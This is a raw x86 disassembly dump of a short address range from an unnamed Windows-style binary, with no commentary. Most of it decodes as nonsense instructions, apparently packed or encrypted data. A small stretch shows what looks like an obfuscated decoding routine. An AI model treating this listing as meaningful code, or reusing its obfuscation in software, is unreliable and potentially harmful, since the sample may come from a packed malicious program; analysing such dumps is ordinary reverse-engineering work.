  4051d0:	push   eax
  4051d1:	aas    
  4051d2:	jns    0x4051d1
  4051d4:	inc    edx
  4051d5:	cwde   
  4051d6:	shl    DWORD PTR [ecx+0x4],1
  4051d9:	and    edx,edx
  4051db:	gs mov ecx,?
  4051de:	jne    0x4051d5
  4051e0:	xor    esp,ebx
  4051e2:	xor    BYTE PTR [edi+0x6205dd27],dh
  4051e8:	neg    bh
  4051ea:	jmp    0x3778:0xb330a8f6
  4051f1:	jae    0x4051da
  4051f3:	push   ecx
  4051f4:	mov    WORD PTR [edi+0x46],?
  4051f7:	ror    BYTE PTR [edx],0x5a
  4051fa:	mov    bl,0x7a
  4051fc:	add    dh,ah
  4051fe:	js     0x40527c
  405200:	and    esi,DWORD PTR [eax-0x6f526886]
  405206:	dec    eax
  405207:	rcr    DWORD PTR [esi-0x1c30c803],1
  40520d:	into   
  40520e:	or     al,BYTE PTR [esi+0x6e]
  405211:	pop    ecx
  405212:	les    ecx,FWORD PTR [ebp-0xb]
  405215:	cwde   
  405216:	loope  0x405289
  405218:	enter  0xf9e2,0x84
  40521c:	push   eax
  40521d:	pop    esi
  40521e:	fwait
  40521f:	fwait
  405220:	dec    edx
  405221:	inc    edx
  405222:	dec    eax
  405223:	(bad)  
  405224:	out    0x5e,al
  405226:	(bad)  
  405227:	sbb    dl,BYTE PTR [edx]
  405229:	jle    0x40524b
  40522b:	cld    
  40522c:	mov    al,BYTE PTR [esi-0x12]
  40522f:	mov    al,0x7e
  405231:	(bad)  
  405232:	int    0x2a
  405234:	sub    ebp,ebx
  405236:	popf   
  405237:	fidivr WORD PTR [eax+0x12e3d020]
  40523d:	lds    edx,FWORD PTR [ecx+0x5d693314]
  405243:	xor    DWORD PTR ds:0x43056daa,esi
  405249:	ror    BYTE PTR [edi+ebp*4+0x34],cl
  40524d:	adc    DWORD PTR [ebp-0x29],eax
  405250:	(bad)  
  405251:	sti    
  405252:	jno    0x40522a
  405254:	and    DWORD PTR [ebp+0x0],esp
  405257:	ins    DWORD PTR es:[edi],dx
  405258:	mov    ?,ebx
  40525a:	inc    ebx
  40525b:	fwait
  40525c:	inc    esi
  40525d:	add    ebp,DWORD PTR [ebp+edi*2+0x10ff0649]
  405264:	xchg   ebx,eax
  405265:	test   BYTE PTR [edi-0x73],bl
  405268:	mov    edx,0x3dde3642
  40526d:	pop    ds
  40526e:	jmp    0xd34e69ea
  405273:	dec    ebp
  405274:	faddp  st(6),st
  405276:	jl     0x4052d8
  405278:	or     edx,ebx
  40527a:	ss test eax,0x329b9b75
  405280:	jne    0x40526c
  405282:	adc    eax,0x7ea305ff
  405287:	mov    dh,0x7b
  405289:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40528a:	stos   DWORD PTR es:[edi],eax
  40528b:	and    dl,BYTE PTR [edi-0x1107c880]
  405291:	jge    0x4052bd
  405293:	sbb    al,0x4a
  405295:	into   
  405296:	ret    0x29df
  405299:	inc    esp
  40529a:	psubw  mm2,QWORD PTR [edx+ecx*8-0x15ec2e46]
  4052a2:	imul   DWORD PTR [ecx+ebx*2]
  4052a5:	into   
  4052a6:	test   BYTE PTR [edx+0x25],bl
  4052a9:	mov    cl,0x2a
  4052ab:	out    dx,eax
  4052ac:	push   eax
  4052ad:	rcr    esp,0x4d
  4052b0:	sub    DWORD PTR [ebx-0x53],0x4355b4da
  4052b7:	(bad)  
  4052b9:	jmp    0x4052b1
  4052bb:	retf   0x1a5b
  4052be:	mov    edx,0x6dbb311d
  4052c3:	mov    ecx,0xfb367c60
  4052c8:	fwait
  4052c9:	push   esi
  4052ca:	cmp    ch,ah
  4052cc:	(bad)  
  4052cd:	mov    al,ds:0xc523382a
  4052d2:	lds    ecx,FWORD PTR ss:[esi]
  4052d5:	or     DWORD PTR [esp+ebp*4+0x2b],ebx
  4052d9:	xchg   DWORD PTR [ecx+0x4be80ed2],edx
  4052df:	xchg   edx,eax
  4052e0:	inc    ebx
  4052e1:	cmp    eax,0xdcc7756f
  4052e6:	mov    ch,0x34
  4052e8:	(bad)  
  4052e9:	cwde   
  4052ea:	mov    dl,0xef
  4052ec:	cld    
  4052ed:	push   esi
  4052ee:	lods   eax,DWORD PTR ds:[esi]
  4052ef:	xor    al,0xa6
  4052f1:	mov    ds:0xd39aa9c4,al
  4052f6:	inc    eax
  4052f7:	cdq    
  4052f8:	fild   DWORD PTR [ecx+0x47]
  4052fb:	outs   dx,DWORD PTR ds:[esi]
  4052fc:	jmp    0xd500797c
  405301:	sub    dh,ah
  405303:	adc    esp,DWORD PTR [ecx+0x300a7e96]
  405309:	dec    esp
  40530a:	add    DWORD PTR [edx+0x6e5ecf86],edx
  405310:	jle    0x40531a
  405312:	out    dx,eax
  405313:	adc    BYTE PTR [esi],dl
  405315:	div    ah
  405317:	enter  0x4798,0xef
  40531b:	pop    ebx
  40531c:	clc    
  40531d:	push   esi
  40531e:	(bad)  
  40531f:	ss (bad) 
  405321:	sub    eax,0xaacaf7be
  405326:	push   edx
  405327:	xchg   esi,eax
  405328:	mov    edx,0x20d76977
  40532d:	outs   dx,BYTE PTR ds:[esi]
  40532e:	jae    0x405387
  405330:	lea    ebp,[eax+eax*1-0x43]
  405334:	lods   al,BYTE PTR ds:[esi]
  405335:	or     ch,BYTE PTR [esi+0x42e22981]
  40533b:	outs   dx,DWORD PTR ds:[esi]
  40533c:	xor    esp,DWORD PTR [edx-0x18]
  40533f:	frstor [edx-0x26e38530]
  405345:	inc    ecx
  405346:	push   edi
  405347:	pushf  
  405348:	int    0x51
  40534a:	xor    DWORD PTR [edi+eax*2],ecx
  40534d:	xor    ecx,DWORD PTR [edi-0x46]
  405350:	popf   
  405351:	inc    ebp
  405352:	pop    ds
  405353:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405354:	sub    eax,ebx
  405356:	pop    edx
  405357:	mov    edi,esi
  405359:	pop    esp
  40535a:	sub    dl,0x46
  40535d:	aad    0xf1
  40535f:	nop
  405360:	mov    ecx,0x9a75647
  405365:	imul   cl
  405367:	sub    dl,BYTE PTR [eax-0x42825f89]
  40536d:	or     edx,DWORD PTR [esp+eiz*2]
  405370:	js     0x4053db
  405372:	(bad)  
  405373:	adc    bh,bl
  405375:	jbe    0x405332
  405377:	(bad)  
  405378:	test   DWORD PTR [esp+edx*1+0x7d],esp
  40537c:	stc    
  40537d:	pop    ss
  40537e:	and    al,0xf3
  405380:	push   ss
  405381:	aam    0xce
  405383:	mov    BYTE PTR [ebx+eax*1+0x3703064a],dh
  40538a:	ficomp WORD PTR [ebx]
  40538c:	pop    ebp
  40538d:	adc    ebp,DWORD PTR [esp+ecx*8-0x2c]
  405391:	or     DWORD PTR [eax-0x45],ebx
  405394:	cwde   
  405395:	dec    edi
  405396:	int3   
  405397:	nop
  405398:	xor    eax,0x4d7e02ab
  40539d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40539e:	loope  0x4053a8
  4053a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4053a1:	hlt    
  4053a2:	mov    cs,edx
  4053a4:	sub    BYTE PTR [ebx],cl
  4053a6:	ficom  DWORD PTR [ebp-0x595dc1fc]
  4053ac:	and    DWORD PTR [ecx+0x4b],esi
  4053af:	and    esi,DWORD PTR [edi]
  4053b1:	ja     0x4053f8
  4053b3:	hlt    
  4053b4:	mov    esp,0xa47a8889
  4053b9:	pop    es
  4053ba:	daa    
  4053bb:	xchg   ebx,eax
  4053bc:	push   0xffffffe3
  4053be:	cld    
  4053bf:	xchg   ecx,eax
  4053c0:	test   ebp,ecx
  4053c2:	jle    0x405392
  4053c4:	adc    eax,0x683db61f
  4053c9:	pop    ebx
  4053ca:	adc    ch,BYTE PTR es:[esi+0x5a]
  4053ce:	and    dl,BYTE PTR [ebx+0x3b]
  4053d1:	inc    edi
  4053d2:	mov    edi,0xda684b37
  4053d7:	(bad)  
  4053d8:	pop    ebx
  4053d9:	mov    ebx,0x65711bd9
  4053de:	icebp  
  4053df:	imul   BYTE PTR [edi-0xd8d07a2]
  4053e5:	data16 mov bh,0xfc
  4053e8:	push   ebp
  4053e9:	mov    ecx,0xe1365a51
  4053ee:	rcl    BYTE PTR [esi+0x44],1
  4053f1:	loope  0x4053c9
  4053f3:	dec    edi
  4053f4:	and    eax,0x58c93e63
  4053f9:	mov    esp,0x85fe77ef
  4053fe:	out    0xa0,al
  405400:	pop    es
  405401:	sbb    BYTE PTR [ebp+0x41],dl
  405404:	iret   
  405405:	push   cs
  405406:	arpl   WORD PTR [ebx],dx
  405408:	xor    ah,BYTE PTR [eax+0x46cd3e0]
  40540e:	add    cl,BYTE PTR ds:0x359f6187
  405414:	inc    edi
  405415:	jecxz  0x4053fd
  405417:	mov    al,ds:0x554964d7
  40541c:	cmp    al,0x24
  40541e:	(bad)  
  40541f:	in     eax,dx
  405420:	mov    ebp,0x9427ba23
  405425:	popf   
  405426:	clc    
  405427:	cmp    BYTE PTR [ecx],bh
  405429:	and    ebp,DWORD PTR [edx+0x2]
  40542c:	push   cs
  40542d:	in     al,0x0
  40542f:	sub    al,0xa0
  405431:	add    ebx,edi
  405433:	or     al,0xa6
  405435:	add    bl,dl
  405437:	dec    esp
  405438:	cmp    dl,BYTE PTR [esp+eiz*4+0x36cc66ec]
  40543f:	push   ebx
  405440:	mov    ch,0x8d
  405442:	push   ebx
  405443:	push   ebx
  405444:	sti    
  405445:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405446:	and    ah,ah
  405448:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405449:	sbb    BYTE PTR [eax+0x49],al
  40544c:	loopne 0x405455
  40544e:	pop    eax
  40544f:	push   ebx
  405450:	ds int3 
  405452:	mov    ebp,0xf2b6195a
  405457:	mov    cl,0xec
  405459:	add    DWORD PTR [eax+0x3db7ef4a],ebx
  40545f:	fiadd  DWORD PTR [esi+0x62]
  405462:	test   eax,0x860ffa3b
  405467:	push   ebp
  405468:	idiv   bh
  40546a:	dec    DWORD PTR [ebx+0x7d8bf455]
  405470:	fsub   st(1),st
  405472:	inc    BYTE PTR [edx]
  405474:	add    BYTE PTR [eax],al
  405476:	outs   dx,DWORD PTR ds:[esi]
  405477:	fisttp QWORD PTR [esi+0x6f6d8cef]
  40547d:	pop    ebp
  40547e:	fmul   QWORD PTR [edi+0x746fbb8]
  405484:	out    0x77,eax
  405486:	shr    BYTE PTR [ebx],1
  405488:	jle    0x405508
  40548a:	pop    eax
  40548b:	jl     0x40550b
  40548d:	jle    0x40544b
  40548f:	sbb    eax,edx
  405491:	and    eax,0xc45d9d70
  405496:	clc    
  405497:	push   edi
  405498:	mov    esi,0xc657ff06
  40549d:	dec    ecx
  40549e:	push   ecx
  40549f:	packsswb mm5,QWORD PTR [ebx+esi*1+0x36]
  4054a4:	push   0xdd4e0de5
  4054a9:	adc    eax,0x8e260a96
  4054ae:	cmp    al,0x7b
  4054b0:	dec    eax
  4054b1:	pop    ebx
  4054b2:	aas    
  4054b3:	loopne 0x4054bd
  4054b5:	and    eax,0xa2fc3b57
  4054ba:	dec    ebp
  4054bb:	mov    ch,0x47
  4054bd:	ret    0x4fb2
  4054c0:	popa   
  4054c1:	lea    ebp,[ebx-0x69]
  4054c4:	ins    DWORD PTR es:[edi],dx
  4054c5:	adc    BYTE PTR [edi+ecx*1+0xa],dl
  4054c9:	adc    ecx,ebx
  4054cb:	xchg   ecx,eax
  4054cc:	push   0xaa47712f
  4054d1:	inc    edi
  4054d2:	stc    
  4054d3:	(bad)  
  4054d5:	pop    esp
  4054d6:	sub    BYTE PTR [ebx],dh
  4054d8:	pop    edi
  4054d9:	sbb    eax,0xcfbb3a1e
  4054de:	(bad)  
  4054df:	enter  0x13c6,0x37
  4054e3:	lods   eax,DWORD PTR gs:[esi]
  4054e5:	ja     0x405553
  4054e7:	inc    edi
  4054e8:	pop    ebp
  4054e9:	push   ds
  4054ea:	pop    ds
  4054eb:	or     bl,dh
  4054ed:	sahf   
  4054ee:	jmp    0x1ad:0x1c1645ad
  4054f5:	int3   
  4054f6:	aas    
  4054f7:	cmp    eax,0x2dff6145
  4054fc:	xlat   BYTE PTR ds:[ebx]
  4054fd:	test   al,0x9a
  4054ff:	sbb    DWORD PTR [ebp+0x6],ebp
  405502:	scas   al,BYTE PTR es:[edi]
  405503:	arpl   bx,sp
  405505:	push   cs
  405506:	repnz mov ds:0x69af0832,eax
  40550c:	stos   DWORD PTR es:[edi],eax
  40550d:	xchg   ebp,eax
  40550e:	and    DWORD PTR [ebx],0x1652ae74
  405514:	push   ds
  405515:	push   esp
  405516:	loop   0x4054e5
  405518:	lock fadd DWORD PTR [esi+0x18042875]
  40551f:	mov    dh,0x2b
  405521:	jbe    0x40556a
  405523:	sbb    BYTE PTR [ebx],bl
  405525:	mov    esp,0xdf950354
  40552a:	stos   DWORD PTR es:[edi],eax
  40552b:	repnz pop edi
  40552d:	mov    esp,0xdda233e7
  405532:	sub    ebp,eax
  405534:	cmp    ch,BYTE PTR [eax+0x8]
  405537:	or     DWORD PTR [eax-0x46],0xcb5e184a
  40553e:	ficom  WORD PTR [edi-0x1d]
  405541:	mov    WORD PTR [ecx+edi*2],?
  405544:	add    DWORD PTR ds:[ebx+eiz*2-0x42c866f2],ebp
  40554c:	add    eax,0x81ee0b7f
  405551:	ret    0xccf1
  405554:	(bad)  
  405555:	jmp    FWORD PTR [esi-0x7d36738b]
  40555b:	clc    
  40555c:	aad    0x87
  40555e:	jno    0x40556e
  405560:	aad    0x59
  405562:	stc    
  405563:	mov    ebx,0x28c3c0b3
  405568:	in     al,0xf4
  40556a:	lods   eax,DWORD PTR ds:[esi]
  40556b:	xchg   edx,eax
  40556c:	pushf  
  40556d:	rcr    BYTE PTR [ecx-0x49f4810d],cl
  405573:	push   ds
  405574:	mov    ds:0x5e2f492,eax
  405579:	adc    DWORD PTR [esi+0x271d104a],ebp
  40557f:	jns    0x40555f
  405581:	sbb    eax,0x37a15a1e
  405586:	jl     0x40557e
  405588:	xchg   BYTE PTR [esi],cl
  40558a:	icebp  
  40558b:	pusha  
  40558c:	adc    BYTE PTR [edx],0xa1
  40558f:	outs   dx,BYTE PTR ds:[esi]
  405590:	adc    eax,0xff64e09c
  405595:	push   esi
  405596:	or     BYTE PTR [edi-0x6a8ce9b5],bh
  40559c:	mov    dl,0x68
  40559e:	jno    0x40557b
  4055a0:	push   ss
  4055a1:	jbe    0x405543
  4055a3:	ret    0x3588
  4055a6:	or     DWORD PTR [edx+0x4e],esp
  4055a9:	cmc    
  4055aa:	fcmovnb st,st(5)
  4055ac:	fstp   DWORD PTR [edx+0x26]
  4055af:	mov    esp,0xc09e54de
  4055b4:	jmp    0x4055b8
  4055b6:	mov    ds:0x5ca9f825,eax
  4055bb:	cmp    DWORD PTR [edx+0x5c1aa4bd],0x57453c60
  4055c5:	xchg   eax,edi
  4055c7:	fs mov al,0xcc
  4055ca:	ins    BYTE PTR es:[edi],dx
  4055cb:	jl     0x405600
  4055cd:	xchg   esi,eax
  4055ce:	and    al,0xcf
  4055d0:	xchg   esp,eax
  4055d1:	scas   eax,DWORD PTR es:[edi]
  4055d2:	mov    DWORD PTR [edx-0x503b3d29],edi
  4055d8:	mov    ss,WORD PTR [edx]
  4055da:	push   eax
  4055db:	xor    DWORD PTR [edi],eax
  4055dd:	sbb    esp,eax
  4055df:	in     eax,0xca
  4055e1:	mov    ecx,0xad6cd476
  4055e6:	xchg   ecx,eax
  4055e7:	ret    
  4055e8:	pop    ebx
  4055e9:	mov    al,0x1e
  4055eb:	mov    dl,0x84
  4055ed:	ins    BYTE PTR es:[edi],dx
  4055ee:	xor    eax,0x162f5c89
  4055f3:	inc    ebx
  4055f4:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  4055f6:	shl    BYTE PTR [eax-0x60],cl
  4055f9:	mov    ds:0x2a6193c9,eax
  4055fe:	ins    DWORD PTR es:[edi],dx
  4055ff:	pusha  
  405600:	jne    0x40566e
  405602:	das    
  405603:	push   cs
  405604:	cmp    DWORD PTR [ebx+0x2714e245],ebp
  40560a:	daa    
  40560b:	stos   BYTE PTR es:[edi],al
  40560c:	pop    es
  40560d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40560e:	dec    ebx
  40560f:	imul   eax,DWORD PTR [ecx],0x3179130
  405615:	xor    bl,dh
  405617:	cmp    eax,0x60f1e0e2
  40561c:	pop    es
  40561d:	add    ah,ah
  40561f:	lea    ebp,[eax]
  405621:	push   esp
  405622:	scas   al,BYTE PTR es:[edi]
  405623:	jnp    0x4055dd
  405625:	add    DWORD PTR [ebp+0x32],esi
  405628:	inc    ebx
  405629:	dec    ebp
  40562a:	(bad)  [ecx+edx*4]
  40562d:	sbb    BYTE PTR [edi-0x60],bl
  405630:	test   edx,edi
  405632:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405633:	add    esi,edi
  405635:	sbb    DWORD PTR [ecx+0xa9924c3],ebp
  40563b:	push   es
  40563c:	lods   eax,DWORD PTR ds:[esi]
  40563d:	mov    BYTE PTR [ebx+edx*8-0x61bd8dd3],dh
  405644:	inc    esi
  405645:	(bad)  
  405646:	imul   edx,DWORD PTR [esi+0x3f],0x48d07d23
  40564d:	iret   
  40564e:	test   BYTE PTR [eax+0x66aca229],dl
  405654:	shl    DWORD PTR [edi+0x51],cl
  405657:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405658:	add    al,0xe0
  40565a:	in     al,dx
  40565b:	(bad)  
  40565c:	aad    0x71
  40565e:	mov    cs,ebp
  405660:	inc    edx
  405661:	push   ebx
  405663:	jl     0x4056d0
  405665:	adc    bh,al
  405667:	sub    al,0x8
  405669:	mov    al,ds:0x66a5173e
  40566e:	ret    0x81dd
  405671:	gs loopne 0x405652
  405674:	repz call 0xe5bed324
  40567a:	or     eax,0x96d3817d
  40567f:	bound  edi,QWORD PTR [eax+0x3ba6a726]
  405685:	jns    0x405635
  405687:	inc    esi
  405688:	lods   al,BYTE PTR ds:[esi]
  405689:	jo     0x405683
  40568b:	outs   dx,DWORD PTR ds:[esi]
  40568c:	inc    ecx
  40568d:	sub    eax,0xeaabd324
  405692:	sub    al,0x91
  405694:	lds    esp,FWORD PTR [ecx]
  405696:	and    eax,0x2e80c0d0
  40569b:	mov    esi,ebp
  40569d:	adc    ebx,DWORD PTR [esp+eiz*2]
  4056a0:	and    BYTE PTR [ebp-0x7e],bh
  4056a3:	add    eax,0xcc311eac
  4056a8:	lahf   
  4056a9:	pop    ebx
  4056aa:	or     BYTE PTR [ecx+ecx*4+0x18dca018],0x79
  4056b2:	idiv   bh
  4056b4:	jmp    0x8caabbed
  4056b9:	pop    esi
  4056ba:	mov    dl,0x86
  4056bc:	pop    edx
  4056bd:	inc    ecx
  4056be:	xchg   esi,eax
  4056bf:	xchg   edx,eax
  4056c0:	and    bh,BYTE PTR [ebp+0x41f61a2a]
  4056c6:	ins    BYTE PTR es:[edi],dx
  4056c7:	mov    cl,0xc4
  4056c9:	ins    DWORD PTR es:[edi],dx
  4056ca:	lahf   
  4056cb:	bound  esi,QWORD PTR [ebx]
  4056cd:	out    dx,al
  4056ce:	mov    ds:0xf97b6157,eax
  4056d3:	iret   
  4056d4:	xchg   edx,eax
  4056d5:	dec    ebx
  4056d6:	mov    edx,0xecb926b
  4056db:	jecxz  0x4056e6
  4056dd:	jae    0x40575b
  4056df:	push   es
  4056e0:	fistp  WORD PTR [ecx-0x549cdac2]
  4056e6:	fcomp  st(1)
  4056e8:	mov    ds:0xfd80095e,al
  4056ed:	mov    al,0x26
  4056ef:	or     BYTE PTR [ebx],al
  4056f1:	std    
  4056f2:	lods   al,BYTE PTR ds:[esi]
  4056f3:	inc    eax
  4056f4:	popf   
  4056f5:	xchg   esp,eax
  4056f6:	xor    BYTE PTR [edx+0x6aff29dc],ch
  4056fc:	mov    al,ds:0x73728e0b
  405701:	mov    edx,ebp
  405703:	jns    0x405707
  405705:	or     ah,dh
  405707:	clc    
  405708:	jle    0x405736
  40570a:	sbb    dh,bl
  40570c:	cwde   
  40570d:	xor    eax,0x6bcff8f8
  405712:	adc    edx,DWORD PTR [eax]
  405714:	cmp    ebx,ebp
  405716:	adc    BYTE PTR [edx],dl
  405718:	inc    edx
  405719:	fisubr DWORD PTR [edi+0x1b]
  40571c:	pop    ss
  40571d:	push   es
  40571e:	pusha  
  40571f:	mov    ebp,0x70bd9c5a
  405724:	popa   
  405725:	fsub   DWORD PTR [ecx]
  405727:	enter  0xda41,0x20
  40572b:	cdq    
  40572c:	icebp  
  40572d:	rcr    DWORD PTR [ebx+ebp*8+0x78d829c9],cl
  405734:	cmp    bh,BYTE PTR [eax+0x38ed59a9]
  40573a:	adc    eax,0x3535ec3a
  40573f:	cmp    eax,0x31a84326
  405744:	jns    0x4056e5
  405746:	das    
  405747:	push   edi
  405748:	or     dh,BYTE PTR [bx+di-0x14]
  40574c:	xor    al,0x2d
  40574e:	push   ss
  40574f:	push   ebx
  405750:	cmp    eax,0xffffffb3
  405753:	sbb    ebx,ebx
  405755:	call   0xffb0:0x496c11b2
  40575c:	ss jo  0x4056e8
  40575f:	jmp    0xc1efad8
  405764:	ja     0x4056fc
  405766:	sbb    al,bh
  405768:	sar    DWORD PTR [ebx],0x99
  40576b:	shrd   esi,ebx,0xa7
  40576f:	pop    ds
  405770:	xor    al,0x89
  405772:	pop    esp
  405773:	mov    cl,0x33
  405775:	rol    BYTE PTR [ebx],1
  405777:	ror    DWORD PTR [edi],1
  405779:	scas   eax,DWORD PTR es:[edi]
  40577a:	xlat   BYTE PTR ds:[ebx]
  40577b:	mov    edi,DWORD PTR [ebp-0x18]
  40577e:	xor    edi,eax
  405780:	add    edx,edi
  405782:	mov    edi,DWORD PTR [ebp-0x8]
  405785:	lea    edx,[edx+edi*1+0x32729b]
  40578c:	mov    DWORD PTR [ebp-0x8],edx
  40578f:	mov    edx,DWORD PTR [ebp-0x20]
  405792:	xor    edx,eax
  405794:	mov    edi,0xffcd8d65
  405799:	sub    edi,edx
  40579b:	add    edi,DWORD PTR [ebp-0x10]
  40579e:	mov    edx,DWORD PTR [ebp-0x20]
  4057a1:	mov    ebx,DWORD PTR [ebp-0x8]
  4057a4:	xor    edx,eax
  4057a6:	add    edx,ecx
  4057a8:	imul   edx,ebx
  4057ab:	cmp    edx,edi
  4057ad:	jbe    0x4038ea
  4057b3:	pop    ebx
  4057b4:	pop    edi
  4057b5:	leave  
  4057b6:	ret    0x8
  4057b9:	push   ebp
  4057ba:	mov    ebp,esp
  4057bc:	push   ecx
  4057bd:	mov    ecx,DWORD PTR [ebp+0x8]
  4057c0:	and    eax,DWORD PTR ds:0x43381b
  4057c6:	mov    eax,0x7510854
  4057cb:	xor    DWORD PTR ds:0x433723,0x433703
  4057d5:	xor    ecx,eax
  4057d7:	not    DWORD PTR ds:0x43375f
  4057dd:	add    ecx,0x32729b
  4057e3:	jmp    0x405b32
  4057e8:	scas   eax,DWORD PTR es:[edi]
  4057e9:	inc    BYTE PTR [ebp-0x39]
  4057ec:	jne    0x4057b3
  4057ee:	lods   eax,DWORD PTR ds:[esi]
  4057ef:	jbe    0x4057a1
  4057f1:	loopne 0x4057f0
  4057f3:	mov    al,0xa0
  4057f5:	and    bl,BYTE PTR [ecx]
  4057f7:	outs   dx,BYTE PTR ds:[esi]
  4057f8:	cmp    dh,BYTE PTR [esi]
  4057fa:	jle    0x40587a
  4057fc:	sub    al,0x7d
  4057fe:	jle    0x40587e
  405800:	daa    
  405801:	adc    esp,DWORD PTR [edx-0x4684b5b0]
  405807:	js     0x405831
  405809:	sbb    BYTE PTR [edx],dl
  40580b:	pop    es
  40580c:	sub    DWORD PTR [edi+0x5db5acab],edx
  405812:	cmc    
  405813:	xor    eax,esp
  405815:	ror    BYTE PTR [ebx+0x73bd218f],cl
  40581b:	push   ebx
  40581c:	adc    eax,0x64a61c6a
  405821:	adc    al,0xd4
  405823:	jge    0x40584b
  405825:	test   eax,0x157391fe
  40582a:	out    dx,eax
  40582b:	stos   DWORD PTR es:[edi],eax
  40582c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40582d:	stos   DWORD PTR es:[edi],eax
  40582e:	call   0x5496f9b
  405833:	nop
  405834:	es jnp 0x40583b
  405837:	or     ebx,DWORD PTR fs:[edx+0x57015ec0]
  40583e:	push   esi
  40583f:	jo     0x405847
  405841:	xchg   esp,eax
  405842:	jg     0x4058bb
  405844:	sbb    DWORD PTR [edi+ecx*4+0x74fa971d],ebx
  40584b:	out    0x2,eax
  40584d:	js     0x4057f2
  40584f:	clc    
  405850:	addr16 mov esp,0x4b8ca94d
  405856:	or     BYTE PTR [ebp-0x1e],cl
  405859:	pop    ss
  40585a:	mov    ebp,0xfccb048f
  40585f:	shr    DWORD PTR [esi+esi*4+0x16],0x54
  405864:	les    ebx,FWORD PTR [esi+0x3]
  405867:	pop    es
  405868:	or     eax,0xa4ca6773
  40586d:	xor    edi,DWORD PTR [esi+eiz*8-0x130dacea]
  405874:	sub    BYTE PTR [ecx+0x30],ah
  405877:	aad    0xf9
  405879:	in     al,0x3c
  40587b:	hlt    
  40587c:	sub    eax,0xad4b022b
  405881:	pop    ds
  405882:	dec    esi
  405883:	mov    eax,0x7d8b428c
  405888:	(bad)  
  405889:	clc    
  40588a:	into   
  40588b:	outs   dx,DWORD PTR ds:[esi]
  40588c:	cmp    BYTE PTR [ebp-0x58],0x8a
  405890:	pop    edx
  405891:	icebp  
  405892:	mov    BYTE PTR [ecx+0x1f],bh
  405895:	xor    DWORD PTR [edx],ebp
  405897:	ror    BYTE PTR [ebx-0x39d4e629],0xa9
  40589e:	out    0xbc,al
  4058a0:	jae    0x4058e6
  4058a2:	test   ah,ch
  4058a4:	or     al,0x62
  4058a6:	xor    ecx,DWORD PTR [edi+ecx*8]
  4058a9:	dec    ecx
  4058aa:	shr    cl,0xf0
  4058ad:	mov    ecx,0x5c21c0d2
  4058b2:	jnp    0x40586f
  4058b4:	out    dx,al
  4058b5:	jmp    0xf6e9:0x8ca27859
  4058bc:	mov    BYTE PTR [ebp-0x965efd2],dh
  4058c2:	pop    es
  4058c3:	aas    
  4058c4:	jmp    0x405893
  4058c6:	and    DWORD PTR [eax+esi*8-0x38d911e3],0xffffffa3
  4058ce:	imul   ebx,DWORD PTR [ebx],0x7f
  4058d1:	imul   ecx,DWORD PTR [ecx],0xffffff99
  4058d4:	cmp    eax,0x9e5bcbfe
  4058d9:	aam    0xc3
  4058db:	xlat   BYTE PTR ds:[ebx]
  4058dc:	xor    dl,BYTE PTR [ecx-0x53]
  4058df:	fisttp WORD PTR [ecx+esi*8+0x6fc71083]
  4058e6:	data16 aaa 
  4058e8:	jmp    0x951:0xdb4436b0
  4058ef:	mov    ah,0xf2
  4058f1:	and    cl,BYTE PTR [ebx-0x2f]
  4058f4:	push   edi
  4058f5:	jl     0x40588c
  4058f7:	adc    eax,0x34696699
  4058fc:	push   ecx
  4058fd:	push   ss
  4058fe:	popf   
  4058ff:	jge    0x405930
  405901:	in     eax,dx
  405902:	pushf  
  405903:	mov    eax,0xd1a8bd1c
  405908:	sub    BYTE PTR [ecx],bh
  40590a:	mov    bl,0x90
  40590c:	in     al,dx
  40590d:	fcom   DWORD PTR [eax+0x7f]
  405910:	nop
  405911:	jae    0x4058b5
  405913:	jb     0x4058f8
  405915:	ja     0x405975
  405917:	or     ebp,ebx
  405919:	push   esp
  40591a:	rcr    BYTE PTR [esi+0x78654491],1
  405920:	adc    eax,0x90241076
  405925:	test   al,0x78
  405927:	ficomp WORD PTR [ebp+eiz*2-0x46]
  40592b:	add    ebx,DWORD PTR [ebx]
  40592d:	shl    esi,1
  40592f:	ror    BYTE PTR [edx],cl
  405931:	add    BYTE PTR [edi+0x50],al
  405934:	jl     0x40594c
  405936:	fist   WORD PTR [ebx*1-0x9f104e9]
  40593d:	rcl    BYTE PTR [esi+esi*8],1
  405940:	ja     0x4059a9
  405942:	or     edx,DWORD PTR [ecx-0xd]
  405945:	cmp    esp,DWORD PTR [ecx]
  405947:	or     eax,0x56a35d56
  40594c:	sbb    al,0x9e
  40594e:	xor    eax,0xccf791e0
  405953:	push   esp
  405954:	jne    0x40598b
  405956:	repz add ecx,DWORD PTR [edx-0x3de75fed]
  40595d:	test   ebx,0x44d25d66
  405963:	and    BYTE PTR [edi-0x71],ah
  405966:	adc    cl,BYTE PTR [ebp-0x3c46432a]
  40596c:	sahf   
  40596d:	daa    
  40596e:	mov    dh,0x0
  405970:	aaa    
  405971:	test   eax,0x913cc767
  405976:	inc    ebx
  405977:	dec    edx
  405978:	and    BYTE PTR [edx+edx*2],al
  40597b:	das    
  40597c:	int3   
  40597d:	xlat   BYTE PTR ds:[ebx]
  40597e:	mov    bh,0x73
  405980:	dec    eax
  405981:	nop
  405982:	lahf   
  405983:	dec    esp
  405984:	mov    eax,0xd86f0ecf
  405989:	xchg   edi,eax
  40598a:	add    bh,BYTE PTR ds:0xb1d825c0
  405990:	stc    
  405991:	fild   WORD PTR [ebx]
  405993:	adc    eax,0x7d0b1dc3
  405998:	pushf  
  405999:	outs   dx,BYTE PTR ds:[esi]
  40599a:	fstp   QWORD PTR [esi+0x5fdc07bc]
  4059a0:	inc    eax
  4059a1:	push   ebp
  4059a2:	rcl    BYTE PTR [eax],cl
  4059a4:	lods   eax,DWORD PTR ds:[esi]
  4059a5:	lock imul edx,DWORD PTR [edx-0x63b9c6ab],0xfffffff5
  4059ad:	scas   eax,DWORD PTR es:[edi]
  4059ae:	ins    BYTE PTR es:[edi],dx
  4059af:	fimul  WORD PTR [ecx]
  4059b1:	xchg   DWORD PTR [edx+0x1d3fad2e],ebp
